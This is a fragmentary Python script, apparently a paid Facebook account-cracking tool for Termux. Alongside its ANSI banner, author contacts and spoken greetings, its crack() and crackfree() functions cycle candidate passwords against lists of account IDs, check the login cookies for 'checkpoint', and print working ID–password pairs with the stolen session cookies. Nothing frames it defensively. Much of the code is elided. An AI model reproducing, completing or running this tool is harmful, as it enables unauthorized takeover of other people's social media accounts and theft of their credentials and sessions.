...
logo ="""\x1b[1;91m
 \x1b[1;91m  _____         __  __  _____  ____  _    _ _____  _____ _____ _   _ 
\x1b[1;91m  / ____|  /\   |  \/  |/ ____|/ __ \| |  | |  __ \|  __ \_   _| \ | |
\x1b[1;91m | (___   /  \  | \  / | (___ | |  | | |  | | |  | | |  | || | |  \| |
\x1b[1;91m  \___ \ / /\ \ | |\/| |\___ \| |  | | |  | | |  | | |  | || | | . ` |
\x1b[1;91m  ____) / ____ \| |  | |____) | |__| | |__| | |__| | |__| || |_| |\  |
\x1b[1;91m |_____/_/    \_\_|  |_|_____/ \____/ \____/|_____/|_____/_____|_| \_|
...
║\x1b[1;91m        [ FARJANA TOMI KANO AMR HOLA NA ]         \x1b[1;91m║

╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝

\x1b[1;91m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\x1b[1;91m 

╠══[Author                   • \x1b[1;91mSamso Uddin ]\x1b[1;91m     ║\x1b[1;91m 

╠══[Facebook                 • Samso Uddin ]   ║  \x1b[1;91m  

╠══[Github                   • \x1b[1;91mSamso Uddin ]   ║\x1b[1;91m   

╠══[Whatsapp                 • 01962555316 ]  ║\x1b[1;91m 

╠══[TOOLS                    • PAID ]         ║ \x1b[1;91m   

╠══[VERSION                  • FUCK U ]          ║\x1b[1;91m 
...
os.system('espeak -a 300 " Welcome,   to,  Samso,  Uddin,  Tools"')
...
def menu():
    ...
    if TUTUL in ['111']:
        ...
        os.system('xdg-open https://wa.me/+01962555316')
...
def crack_file():
    ...
    print('\033[1;32m[ Put File Example:  /sdcard/FUCK.txt  Etc...]')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[SAMSO•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    ...
    for pw in pwv:
        ...
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                print(f'\r\033[0;94m[SAMSO UDDIN-CP] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[SAMSO-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')

                os.system('espeak -a 300 " SAMSO,  Ok,  id"')
...
def crackfree(idf,pwv):
    ...
    sys.stdout.write(f"\r{H}[SAMSO-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    ...
    for pw in pwv:
        ...
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•SAMSO UDDIN-CP] {idf} • {pw}')
                ...
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•SAMSO-Ok] {idf} • {pw} ')

                os.system('espeak -a 300 " Ok,  SAMSO,  id"')
